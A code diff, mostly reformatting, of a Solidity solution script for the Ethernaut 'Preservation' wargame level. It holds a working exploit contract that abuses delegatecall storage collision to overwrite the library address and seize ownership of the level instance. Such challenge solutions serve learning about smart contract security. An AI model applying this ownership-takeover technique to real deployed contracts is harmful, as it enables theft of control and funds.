+++ src/problems/16_Preservation/SolutionScript.sol
@@ -1,29 +1,27 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.6.0;
 
-import { Script } from "forge-std/Script.sol";
-import { EthernautScript } from "src/common/EthernautScript.sol";
-import { Preservation } from "./Problem.sol";
-
+import {Script} from "forge-std/Script.sol";
+import {EthernautScript} from "src/common/EthernautScript.sol";
+import {Preservation} from "./Problem.sol";
 
 contract Solution {
-  // public library contracts 
-  address public timeZone1Library;
-  address public timeZone2Library;
-  address public owner; 
+    // public library contracts
+    address public timeZone1Library;
+    address public timeZone2Library;
+    address public owner;
 
-  function changeOwner(Preservation _preservation) public {
-      _preservation.setFirstTime(uint(address(this)));
-      _preservation.setFirstTime(uint(0));
-  }
+    function changeOwner(Preservation _preservation) public {
+        _preservation.setFirstTime(uint256(address(this)));
+        _preservation.setFirstTime(uint256(0));
+    }
 
-  function setTime(uint) public {
-      owner = tx.origin;
-  }
-} 
+    function setTime(uint256) public {
+        owner = tx.origin;
+    }
+}
 
 contract SolutionScript is EthernautScript {
-
     function solve(address payable _instanceAddress) internal override {
         Preservation preservation = Preservation(_instanceAddress);
 
@@ -34,11 +32,9 @@ contract SolutionScript is EthernautScript {
 
         assert(preservation.owner() == tx.origin);
         vm.stopBroadcast();
-
     }
 
-    function getLevelAddress() internal view override returns(address) {
+    function getLevelAddress() internal view override returns (address) {
         return 0x97E982a15FbB1C28F6B8ee971BEc15C78b3d263F;
     }
 }
-
